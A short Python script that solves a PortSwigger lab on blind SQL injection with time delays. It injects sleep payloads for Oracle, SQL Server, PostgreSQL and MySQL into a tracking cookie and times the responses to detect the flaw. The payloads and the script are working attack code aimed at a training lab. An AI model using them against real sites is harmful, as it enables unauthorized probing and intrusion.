# PortSwigger
# Lab: Blind SQL injection with time delays

import requests
import urllib
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Target Data
url = ""
tracking_id = ""
session = ""

# Localhost Proxies (To intercept with Burp Suite)
proxies = { 'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080' }

# Request Cookies
cookies = {
    "TrackingId": tracking_id,
    "session": session
}

def check_is_vulnerable(database, playload, time_delay):
    print("(+) Database %s: " % database)

    cookies["TrackingId"] = tracking_id + urllib.parse.quote(playload % (time_delay))
    response = requests.get(url, cookies=cookies, verify=False, proxies=proxies)

    if response.elapsed.total_seconds() > time_delay:
        print("     >>> Vulnerable to SQLi. <<<")
    else:
        print("     No vulnerable to SQLi")

def main():
    time_delay = 10

    # Database Oracle        
    check_is_vulnerable("Oracle", "'; dbms_pipe.receive_message(('a'),%s)--", time_delay)    

    # Database Microsoft    
    check_is_vulnerable("Microsoft", "'; WAITFOR DELAY '0:0:%s'--", time_delay)    

    # Database PostgreSQL    
    check_is_vulnerable("PostgreSQL", "'; SELECT pg_sleep(%s) --", time_delay)    

    # Database MySQL    
    check_is_vulnerable("MySQL", "'; SELECT SLEEP(%s) --", time_delay)
    

if __name__ == "__main__":     
    print("(+) Checking if the database is vulnerable to SQLi...")
    main()